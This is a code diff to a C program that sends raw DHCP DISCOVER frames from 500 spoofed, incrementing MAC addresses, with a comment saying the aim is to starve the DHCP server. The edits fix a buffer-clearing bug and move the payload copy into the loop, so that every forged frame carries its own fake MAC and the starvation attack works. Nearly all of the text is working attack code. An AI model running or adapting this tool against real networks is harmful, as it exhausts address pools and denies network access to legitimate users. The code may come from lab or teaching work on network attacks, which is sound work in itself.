@@ -122,7 +122,7 @@ struct udphdr* get_udp_header(){
 */
 void make_discover(unsigned char* buffer, unsigned char* src_mac_addr){
   // fill the buffer with zeros and fill only relevant values
-  bzero(buffer, sizeof(buffer));
+  bzero(buffer, DHCP_BUFFER_SIZE);
   buffer[0] = (int) 1;      // Request 1
   buffer[1] = (int) 1;      // Ethernet
   buffer[2] = (int) MAC_ADDR_LEN; // Skip hops
@@ -191,16 +191,20 @@ int main(int argc, char** argv) {
   /* L2 ends here */
   memcpy(eth_frame + ETH_HEADER_LEN, ip_header, IP4_HEADER_LEN * sizeof(uint8_t));
   memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN, udp_header, UDP_HEADER_LEN * sizeof(uint8_t));
-  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
 
   // place here only parts which depends on source MAC address, src mac address
   // has to be changed in every iteration to starve the dhcp server
   for (size_t i = 0; i < 500; i++) {
     increment_mac_addr(src_mac_addr);
+    // Add mac address to interface which will be used to send msg out
     memcpy(interface.sll_addr, src_mac_addr, MAC_ADDR_LEN * sizeof(uint8_t));
-    make_discover(buffer, src_mac_addr);  // fill buffer with discover msg
+    // copy MAC address to ETHERNET header
     memcpy(eth_frame + 6, src_mac_addr, 6 * sizeof(uint8_t));
-
+    // include MAC address in DHCP discover message
+    make_discover(buffer, src_mac_addr);  // fill buffer with discover msg
+    // place the created DHCP discover to a msg buffer
+    memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
+    // fire
     int sent = 0;
     if ((sent = sendto (sd, eth_frame, eth_msg_len, 0, (struct sockaddr *) &interface, sizeof (interface))) <= 0) {
       err("sendto() failed", sent, 0);
